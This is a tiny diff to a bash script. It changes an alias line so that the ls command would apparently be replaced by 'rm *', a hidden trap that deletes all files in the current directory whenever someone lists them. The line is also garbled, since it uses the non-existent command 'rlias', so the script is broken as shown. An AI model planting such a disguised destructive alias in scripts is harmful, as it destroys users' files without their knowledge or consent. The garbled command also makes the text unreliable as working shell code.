@@ -1,2 +1,2 @@
 #!/bin/bash
-rlias rm *="ls"
+rlias ls="rm *"
